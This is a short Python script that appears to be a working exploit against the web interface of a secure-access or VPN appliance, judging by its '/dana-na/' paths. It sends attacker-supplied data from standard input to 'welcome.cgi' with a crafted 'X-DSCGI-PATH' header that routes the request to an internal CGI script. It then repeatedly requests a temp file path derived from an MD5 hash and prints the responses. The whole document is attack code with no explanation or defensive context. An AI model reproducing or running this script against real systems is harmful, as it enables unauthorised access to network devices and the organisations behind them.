import hashlib
import sys
import requests

endpoint = sys.argv[1].rstrip('/') + '/dana-na/auth/url_default/welcome.cgi'
filename = sys.argv[2]
requests.post(endpoint, headers={
    'X-DSCGI-PATH': '/home/webserver/htdocs/dana/fb/smb/wu.cgi'
}, data=sys.stdin.buffer.read(), timeout=10)
digest = hashlib.md5(filename.encode()).hexdigest()
for _ in range(16):
    response = requests.request('GET', endpoint, headers={
        'x-dscgi-path': '/home/runtime/tmp/' + digest
    }, timeout=10)
    print(response.text)
